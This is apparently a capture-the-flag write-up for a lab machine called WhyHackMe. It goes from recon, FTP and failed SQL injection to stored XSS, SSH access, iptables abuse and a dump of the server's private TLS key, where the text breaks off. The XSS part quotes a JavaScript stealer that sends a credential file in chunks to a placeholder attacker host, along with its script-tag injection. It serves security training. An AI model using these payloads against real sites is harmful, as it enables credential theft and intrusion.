# WHYHACKME

## NMAP


* Command Used:

```bash
sudo nmap -sC -sV -vvv 10.10.248.178 -oN nmap/initial
```

** Output

```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.6.16.164
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVPKwhXf+lo95g0TZQuu+g53eAlA0tuGcD2eIcVNBuxuq46t6mjnkJsCgUX80RB2wWF92OOuHjETDTduiL9QaD2E/hPyQ6SwGsL/p+JQtAXGAHIN+pea9LmT3DO+/L3RTqB1VxHP/opKn4ZsS1SfAHMjfmNdNYALnhx2rgFOGlTwgZHvgtUbSUFnUObYzUgSOIOPICnLoQ9MRcjoJEXa+4Fm7HDjo083hzw5gI+VwJK/P25zNvD1udtx3YII+cnOoYH+lT2h/gPcJKarMxDCEtV+3ObVmE+6oaCPx+eosZ+45YuUoAjNjE/U/KAWIE+Y0Xav87hQ/3ln4bzB8N5WV41/WC5zqIfFzuY+ewx6Q6u6t7ijxZ+AE2sayFIqIgmXKWKq3NM9fgLgUooRpBRANDmlb9xI1hzKobeMPOtDkaZ+rIUxOLtUMIkzmdRAIElz3zlxBD+HAqseFrmXKKvLtL6JllEqtEZShSENNZ5Rbh3nBY4gdiPliolwJkrOVNdhE=
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFynIMOUWPOdqgGO/AVP9xcS/88z57e0DzGjPCTc6OReLmXrB/egND7VnoNYnNlLYtGUILQ1qoTrL7hC+g38pxc=
|   256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKTv0OsWH1pAq3F/Gpj1LZuPXHZZevzt2sgeMLwWUCRt
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

A nice FTP server here with anonymous access :DDD


## FTP

* Command(s) Used:

```bash
ftp 10.10.248.178
```

```bash
ls -lah
```

** Output

```bash
ftp> ls -lah
229 Entering Extended Passive Mode (|||27865|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        119          4096 Mar 14  2023 .
drwxr-xr-x    2 0        119          4096 Mar 14  2023 ..
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
```

One .txt file here, I'll grab it with "get update.txt"

I always check for write access.

```bash
echo test > test.txt

ftp> put test.txt 
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||39893|)
550 Permission denied.

```

No luck this time =/


## update.txt

```bash
cat exfil/update.txt                    
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin
```

Ok so we now know theres a file *somewhere* on the server that has account credentials. Neat.


## Port 80 webserver

![Example Image](images/burp-scope.png)

Going to start by opening BurpSuite and adding the IP (10.10.248.178) to my scope. This prevents Burp's "HTTP History" getting clustered with requests from external sites such as google, hacktricks, github etc.

![Example Image](images/index-1.png)

Aside from the link to: http://10.10.248.178/blog.php there's nothing else that is of note.

### Webserver Directory Enueration

* Command(s) Used:

```bash
feroxbuster -u http://10.10.248.178/ -w /opt/raft-small-words.txt -x php -o dir-enum/80.initial
``` 

I'am a Feroxbuster enjoyer :P

** Output

```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.248.178/
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ dir-enum/80.initial
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       22l      437w     3102c http://10.10.248.178/blog.php
200      GET       29l       66w      563c http://10.10.248.178/index.php
200      GET       20l       38w      523c http://10.10.248.178/login.php
200      GET       33l       74w      606c http://10.10.248.178/assets/login.css
302      GET        0l        0w        0c http://10.10.248.178/logout.php => login.php
200      GET       61l       99w      800c http://10.10.248.178/assets/style.css
200      GET        0l        0w        0c http://10.10.248.178/config.php
301      GET        9l       28w      315c http://10.10.248.178/assets => http://10.10.248.178/assets/
200      GET       29l       66w      563c http://10.10.248.178/
```

I usually include the .php extension whenever I'm fuzzing Apache or when I see a page on the server that is using that extension. There's a couple extra pages here.

*** blog.php
*** login.php
*** config.php

### login.php

![Example Image](images/login-1.png)

Just a very basic looking login page here. I'm going to try a few sets of default credentials, admin:admin, admin:password, admin:letmein etc.


None of them work, I could try using Hydra to brute force, but I'd rather wait until I have at least a valid username first.

#### SQLi fail

* Command(s) Used:

```bash
sqlmap -r login.req --batch
```

I saved the POST request from BurpSuite into a file named "login.req"

```txt
POST /login.php HTTP/1.1
Host: 10.10.248.178
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://10.10.248.178
Connection: close
Referer: http://10.10.248.178/login.php
Cookie: PHPSESSID=k7cqvjjhkij2q7cdqep3pr9nut
Upgrade-Insecure-Requests: 1

username=admin&password=letmein
```

** Output:

```bash
        ___
       __H__                                                                                                                                                                                                                                                
 ___ ___[,]_____ ___ ___  {1.8.3#stable}                                                                                                                                                                                                                    
|_ -| . [)]     | .'| . |                                                                                                                                                                                                                                   
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:57:13 /2024-05-24/

[01:57:13] [INFO] parsing HTTP request from 'login.req'
[01:57:13] [INFO] testing connection to the target URL
[01:57:14] [INFO] testing if the target URL content is stable
[01:57:14] [INFO] target URL content is stable
[01:57:14] [INFO] testing if POST parameter 'username' is dynamic
[01:57:14] [WARNING] POST parameter 'username' does not appear to be dynamic
[01:57:15] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[01:57:15] [INFO] testing for SQL injection on POST parameter 'username'
[01:57:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[01:57:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[01:57:15] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[01:57:16] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[01:57:17] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[01:57:18] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[01:57:19] [INFO] testing 'Generic inline queries'
[01:57:19] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[01:57:19] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[01:57:20] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[01:57:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[01:57:22] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[01:57:22] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[01:57:23] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[01:57:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[01:57:26] [WARNING] POST parameter 'username' does not seem to be injectable
[01:57:26] [INFO] testing if POST parameter 'password' is dynamic
[01:57:26] [WARNING] POST parameter 'password' does not appear to be dynamic
[01:57:26] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[01:57:26] [INFO] testing for SQL injection on POST parameter 'password'
[01:57:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[01:57:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[01:57:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[01:57:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[01:57:29] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[01:57:29] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[01:57:30] [INFO] testing 'Generic inline queries'
[01:57:30] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[01:57:31] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[01:57:32] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[01:57:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[01:57:33] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[01:57:34] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[01:57:35] [INFO] testing 'Oracle AND time-based blind'
[01:57:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[01:57:37] [WARNING] POST parameter 'password' does not seem to be injectable
[01:57:37] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
```

No luck here ;_; If I absolutely cannot find another path, I'll come back to this and TRY HARDER :P


### Webserver Directory Enumeration 2

* Command(s) Used:

```bash
gobuster dir -u http://10.10.248.178/ -w /opt/big-dirb.txt -x php -o dir-enum/80.big-list -e
```

I was running this in the background as I was trying different techniques to gain access to "/dir/pass.txt" and it's a good thing I was. Got a few more hits! :DDD

** Output:

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.248.178/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/big-dirb.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.248.178/.htaccess            (Status: 403) [Size: 278]
http://10.10.248.178/.htpasswd            (Status: 403) [Size: 278]
http://10.10.248.178/.htaccess.php        (Status: 403) [Size: 278]
http://10.10.248.178/.htpasswd.php        (Status: 403) [Size: 278]
http://10.10.248.178/assets               (Status: 301) [Size: 315] [--> http://10.10.248.178/assets/]
http://10.10.248.178/blog.php             (Status: 200) [Size: 3102]
http://10.10.248.178/cgi-bin/             (Status: 403) [Size: 278]
http://10.10.248.178/cgi-bin/.php         (Status: 403) [Size: 278]
http://10.10.248.178/config.php           (Status: 200) [Size: 0]
http://10.10.248.178/dir                  (Status: 403) [Size: 278]
http://10.10.248.178/index.php            (Status: 200) [Size: 563]
http://10.10.248.178/login.php            (Status: 200) [Size: 523]
http://10.10.248.178/logout.php           (Status: 302) [Size: 0] [--> login.php]
http://10.10.248.178/register.php         (Status: 200) [Size: 643]
http://10.10.248.178/server-status        (Status: 403) [Size: 278]
Progress: 40938 / 40940 (100.00%)
===============================================================                                                                                                                                                                                             
Finished                                                                                                                                                                                                                                                    
===============================================================
```

I used the "big.txt" wordlist that comes with Dirb, I like to change up the lists I use when doing multiple fuzzes.

*** logout.php
*** register.php

### register.php

![Example Image](images/register-1.png)

Here we can register a user on the website. I used: test:test and it was successful. (It says "Username already taken" because I forgot to screenshot it before I registered. It gives you a link to the login page after you register)

### login.php again

![Example Image](images/logged-in.png)

After a successful login it now says we can comment on blogs!

### blog.php again

![Example Image](images/comment.png)

Now we can leave comments! There's also a comment left by a user named admin. "Comment: Hey people, I will be monitoring your comments so please be safe and civil."

### XSS

![Example Image](images/xss-1.png)

So after trying a bunch of different payloads and failing, I decided to try putting a payload in the username field during registration and it worked! :DDD

```html
<h2>Name: test<br>Comment: `~!@#$%^&amp;*()_+=-[]{}\|;':&quot;,.&lt;&gt;/?</h2>
```

Looking at the source we can see that its encoding certain special characters so this is why none of the payloads worked in the comments.

## Initial Access

![Example Image](images/google-1.png)

So knowing that theres a working XSS and having an absolute path to a file with credentials a simple Google search gets us a script that will exfiltrate the data to a local webserver.

Highly reccommend reading through this article! https://trustedsec.com/blog/simple-data-exfiltration-through-xss


* Script

```bash
// TrustedSec Proof-of-Concept to steal 
// sensitive data through XSS payload


function read_body(xhr) 
{ 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}




function stealData()
{
	var uri = "/dir/pass.txt";

	xhr = new XMLHttpRequest();
	xhr.open("GET", uri, true);
	xhr.send(null);

	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)	
		{
			// We have the response back with the data
			var dataResponse = read_body(xhr);


			// Time to exfiltrate the HTML response with the data
			var exfilChunkSize = 2000;
			var exfilData      = btoa(dataResponse);
			var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);
			var remainderBits  = exfilData.length % exfilChunkSize;

			// Exfil the yummies
			for (i = 0; i < numFullChunks; i++)
			{
				console.log("Loop is: " + i);

				var exfilChunk = exfilData.slice(exfilChunkSize *i, exfilChunkSize * (i+1));

				// Let's use an external image load to get our data out
				// The file name we request will be the data we're exfiltrating
				var downloadImage = new Image();
				downloadImage.onload = function()
				{
					image.src = this.src;
				};

				// Try to async load the image, whose name is the string of data
				downloadImage.src = "http://YOURIP/exfil/" + i + "/" + exfilChunk + ".jpg";
			}

			// Now grab that last bit
			var exfilChunk = exfilData.slice(exfilChunkSize * numFullChunks, (exfilChunkSize * numFullChunks) + remainderBits);
			var downloadImage = new Image();
			downloadImage.onload = function()
			{
    			image.src = this.src;   
			};

			downloadImage.src = "http://YOURIP/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
			console.log("Done exfiling chunks..");
		}
	}
}



stealData();

```

So whats going to happen here is an account is gettin registered with "<script src=http://YOURIP/stealer.js></script>" as the name. Then start a python webserver "python3 -m http.server PORT". Navigate to /blog.php and post anything as a comment.
You should see a hit on your webserver.

```bash
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.6.16.164 - - [24/May/2024 03:07:03] "GET /stealer.js HTTP/1.1" 200 -
10.6.16.164 - - [24/May/2024 03:07:03] "GET /stealer.js HTTP/1.1" 200 -
10.6.16.164 - - [24/May/2024 03:07:11] code 404, message File not found
10.6.16.164 - - [24/May/2024 03:07:11] "GET /exfil/LAST/PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4KPGh0bWw+PGhlYWQ+Cjx0aXRsZT40MDMgRm9yYmlkZGVuPC90aXRsZT4KPC9oZWFkPjxib2R5Pgo8aDE+Rm9yYmlkZGVuPC9oMT4KPHA+WW91IGRvbid0IGhhdmUgcGVybWlzc2lvbiB0byBhY2Nlc3MgdGhpcyByZXNvdXJjZS48L3A+Cjxocj4KPGFkZHJlc3M+QXBhY2hlLzIuNC40MSAoVWJ1bnR1KSBTZXJ2ZXIgYXQgMTAuMTAuMjQ4LjE3OCBQb3J0IDgwPC9hZGRyZXNzPgo8L2JvZHk+PC9odG1sPgo=.jpg HTTP/1.1" 404 -
10.10.248.178 - - [24/May/2024 03:08:02] "GET /stealer.js HTTP/1.1" 200 -
10.10.248.178 - - [24/May/2024 03:08:02] code 404, message File not found
10.10.248.178 - - [24/May/2024 03:08:02] "GET /exfil/LAST/amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo=.jpg HTTP/1.1" 404 -
```

The 1st string of base64 encoded text is just a standard 403 webpage. The second string is:

```bash
echo 'amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo=' | base64 -d
jack:WhyIsMyPass[REDACTED]
```

Finally a set of credentials! :DDD


### Logging in with SSH

```bash
ssh jack@10.10.248.178                                      
The authenticity of host '10.10.248.178 (10.10.248.178)' can't be established.
ED25519 key fingerprint is SHA256:4vHbB54RGaVtO3RXlzRq50QWtP3O7aQcnFQiVMyKot0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.248.178' (ED25519) to the list of known hosts.
jack@10.10.248.178's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 24 May 2024 07:18:04 AM UTC

  System load:  0.0                Processes:             137
  Usage of /:   79.8% of 11.21GB   Users logged in:       0
  Memory usage: 45%                IPv4 address for eth0: 10.10.248.178
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

64 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jan 29 13:44:19 2024
jack@ubuntu:~$ id
uid=1001(jack) gid=1001(jack) groups=1001(jack)
```

Now we have a shell! :DDD


## Local Enumeration

```bash
jack@ubuntu:~$ sudo -l
[sudo] password for jack: 
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```

If I have a working username and password, "sudo -l" is the first thing I always check. Here we can run iptables with sudo.

### linPEAS basic info

```bash
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                                                          
                              ╚════════════════════╝                                                                                                                                                                                                        
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                                                          
Linux version 5.4.0-159-generic (buildd@lcy02-amd64-117) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #176-Ubuntu SMP Mon Aug 14 12:04:20 UTC 2023                                                                                                   
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.5 LTS
Release:        20.04
Codename:       focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                                                                             
Sudo version 1.8.31                                                                                                                                                                                                                                         


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                                                                                                     
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Other basic informaton from linPEAS

### /opt

```bash
jack@ubuntu:/$ ls -lah /opt/
total 40K
drwxr-xr-x  2 root root 4.0K Aug 16  2023 .
drwxr-xr-x 19 root root 4.0K Mar 14  2023 ..
-rw-r--r--  1 root root  27K Aug 16  2023 capture.pcap
-rw-r--r--  1 root root  388 Aug 16  2023 urgent.txt
```

A couple files here in /opt I'll quickly stand up a webserver on the target using "python3 -m http.server 42069" and download them on my machine with "wget http://MACHINEIP/capture.pcap;wget http://MACHINEIP/urgent.txt"

### urgent.txt

```txt
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
```

Ok so it looks like there are some things to look at in /usr/lib/cgi-bin/ (unaccessible by jack) and a reason for why jack has sudo access for iptables.

### iptables

```bash
udo /usr/sbin/iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
2    ACCEPT     all  --  anywhere             anywhere            
3    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
4    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
5    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
6    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
7    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
8    DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     all  --  anywhere             anywhere
```

Looks like port 41312 is dropping everything.

### capture.pcap

![Example Image](images/encryted.png)

Lots of encrypted data here in the pcap file.

### Opening port 41312

```bash
jack@ubuntu:/opt$ sudo /usr/sbin/iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
2    ACCEPT     all  --  anywhere             anywhere            
3    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
4    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
5    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
6    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
7    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
8    DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     all  --  anywhere             anywhere            
jack@ubuntu:/opt$ sudo /usr/sbin/iptables -D input
iptables: Bad rule (does a matching rule exist in that chain?).
jack@ubuntu:/opt$ sudo /usr/sbin/iptables -D INPUT 1
jack@ubuntu:/opt$ sudo /usr/sbin/iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
jack@ubuntu:/opt$ sudo /usr/sbin/iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:41312
2    ACCEPT     all  --  anywhere             anywhere            
3    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
4    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
5    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
6    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
7    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
8    DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     all  --  anywhere             anywhere
```

Now the port is reopened.

### Investigating 41312

```bash
jack@ubuntu:/opt$ nc 127.0.0.1 41312

HELO
^C
jack@ubuntu:/opt$ curl 127.0.0.1:41312
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
Reason: You're speaking plain HTTP to an SSL-enabled server port.<br />
 Instead use the HTTPS scheme to access this URL, please.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at www.example.com Port 80</address>
</body></html>

```

Netcat didnt really do anything, but cURL did!

### Visiting 41312

![Example Image](images/port-1.png)

Forbidden, sweet lol.

## Escalation to root

So we cant access /usr/lib/cgi-bin which is where the hacker placed some files. Looking back to all of the encrypted data on Wireshark, it should be possible to decrypt it all and see if there's anything useful there.

Getting the certificate key should enable us to do this.

```bash
jack@ubuntu:/opt$ tail -n 15 cat /etc/apache2/sites-available/000-default.conf 
tail: cannot open 'cat' for reading: No such file or directory
==> /etc/apache2/sites-available/000-default.conf <==
        SSLEngine on
        SSLCipherSuite AES256-SHA
        SSLProtocol -all +TLSv1.2
        SSLCertificateFile /etc/apache2/certs/apache-certificate.crt
        SSLCertificateKeyFile /etc/apache2/certs/apache.key
        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        AddHandler cgi-script .cgi .py .pl
        DocumentRoot /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride All 
                Options +ExecCGI -Multiviews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>
</VirtualHost>
```

Checking 000-default.conf shows where its stored (/etc/apache2/certs/apache.key)

### /etc/apache2/certs/apache.key

```bash
jack@ubuntu:/etc/apache2/certs$ cat apache.key 
-----BEGIN PRIVATE KEY-----
MIIJQgIBADANBgkqhkiG9w0BAQEFAASCCSwwggkoAgEAAoICAQDOkNCaT0sHHS1X
/IjqenvRFL5xjYQz38NZ/uZJYtaYTHHZmzE2mXTU4J1rXlKFVeQ6t3j3BenyxGGI
z/EDQqPoxO7D10PzSw5dvGGUcnYA/hgp5XPUijvtHMcMtqlupI15EMel9Cf0aFMY
U1O2nM0YoRpviZn+3rQ7SOzBr+zvo3pmZHe4BK9EO/rnbjmZgWkEa52wgNvy5Lni
hGt9jx2YtTGJtpEqc+ytb6EapU7LSrwDem05DOc/35NvHO+WX/fboN1+l9WVXwxP
dTBx/z5TykrPKjSSTBwzIVjqSmJS82m6NV1278P7JL/qGIBJcJq+AOZ9S0M9WsWs
LVApqvqwT4gtgGoPH0mfYlkcJqFi/raM8GhFqYthAne1L73ZbGeCelKi0bjp1Ixd
0EE1PHrF+Cvr84cke6RXJWA6SCW1y6Xug3ltJhFSagsINzpIqBj6AfHuGPyG3MNO
b9wIpHBL0duw1nEnJN2WNUfdIqB+41/Ihn/m8fbb3KyR7UbxE9iCto1/iMvi/DfW
HioVKPOlWtrGBXtABjHnVSSzDciMq4EyM+FNqUauwYebONs95FOIdJX6zssXxlze
3ZsyBuCAhy5UEOHCm3Au7NQgjGY+9jx3MXOEMfZiMGUOcTE2e/0+pUV7cLQNQbFP
lWXZ+CB/czyvgthZLKDUa8zXqObzpQIDAQABAoICAAkOLiblnPtl2wwFZRcqYW0s
BKFDu+zuPUkftIa5D4FDsKYCeKjVF1sRsbT4QJPZzRSJ4IKrvrLGyyPNQdqLvFXC
9FifgjoTK0EOthRk5Cls+jAz/9zsZm4hmdRD2a+hBRaulqH+zxWW0TW6yWuy+ga/
YUJMfPTAXJRQwRhIlxF2UDJW6yyk/+301y34FgxVsP3hndsT+xBt2HxGo9OwR3Lf
Vpmb6Ec9J73+q8hYQNkGoLFiV5FtsGGLcpInaZVlBZ+aMLuQ+mr+7LI7B/GnZ9sS
fi8QwZc8QOw45QX4VtEeHJ9uIXfKUQQce1FO26jch9wWfAQ4HW1+IjZHEkGRXkXy
Ow8SatGIXev8fMoGgFc4M/QRQUPOlAevsWPwKD8o6gaggDU1DPiqDb1yBLPFaBGJ
STTjvO1LFtpHgNNKvD9fPVQKLZ7poSxnHuEwt9+yyQWvufVB5eDj8IncZz5FCs52
uctxmyHKzjzTRuytQBk70g9xIVOS8bsVK9nojxAlh3ywyHdykIUEzqrZgTxAGZ+e
/TpSIpeAvKRbM0HZ+ePyEU33p9FYGNvLGLUEuXoUDA2Tla4d/zXxnBVviva4AKhh
vbLzkHpp0JQoIVjgZQUBqICk9yG3uA/dKRG+w4zkkdowvFFsaosiwRlCcOc+Ihj7
/iOngWUOfGKOkIJv8Q0hAoIBAQDsj+dl8xB2fzvxMA/L1Vff/VxLqsnQUnltXQ14
2Gcj+Mkm8mLVrJawwW2xCUFMsDHBjc+m9ZkEwVOffJ34vT57/OKTCCkh0afRPNK4
